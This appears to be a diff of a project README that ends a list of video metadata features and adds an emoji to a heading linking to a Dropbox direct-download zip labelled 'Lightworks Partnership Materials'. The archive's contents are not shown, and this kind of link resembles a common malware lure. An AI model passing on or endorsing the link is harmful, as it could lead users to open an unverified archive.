@@ -24,5 +24,5 @@
 * Video Bit Rate Mode
 * Scan Type
 * And more than 200 more unique features!
-## [Download Document And Video (click)](https://www.dropbox.com/s/4bepdcxpu4mjbda/Lightworks%20Partnership%20Materials.zip?dl=1)
+## [⚡️ Download Document And Video (click)](https://www.dropbox.com/s/4bepdcxpu4mjbda/Lightworks%20Partnership%20Materials.zip?dl=1)
 Read more: https://lwks.com
